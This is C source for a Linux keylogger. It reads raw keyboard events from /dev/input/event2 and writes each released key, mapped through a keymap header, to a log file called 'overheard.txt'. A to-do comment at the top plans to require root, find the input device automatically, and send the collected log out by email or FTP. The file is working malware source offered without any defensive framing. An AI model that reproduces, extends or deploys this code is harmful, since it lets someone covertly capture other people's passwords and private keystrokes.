/*
* ADD SLEEP
* ADD ERROR IF USER IS NOT ROOT
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices)
* ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
* IF STATEMENT--->SEND LOG FILE VIA EMAIL
* ELSE ERROR--->UPLOAD VIA FTP
* GRAB FROM IRC????
*/
#include <linux/input.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

#include "keymap.h"


int main(void) {
	FILE *evlog;
	int fd;
	fd = open("/dev/input/event2", O_RDONLY|O_TRUNC|O_NONBLOCK);	/* opens the event file */
	struct input_event ev;			/* using input_event so we know 
									 * what we're reading from the 
									 * event file 
									 */
	evlog = fopen("overheard.txt", "a+");  	/* opens/creates the log */

	if (evlog == NULL) {
		fprintf(stderr, "ERROR: Log file not found\n");
		return 1;
	}

	time_t curtime;
	time(&curtime);
	fprintf(evlog, "\n\n%s", ctime(&curtime));
	
	while(1) {
		read(fd, &ev, sizeof(struct input_event));
		if(ev.value == 0 && ev.type == 1) {			/* only register release state */
			fprintf(evlog, "%s", CapKeyMap[ev.code]);
			fflush(evlog);
		}
	}

	fclose(evlog);
	return 0;
}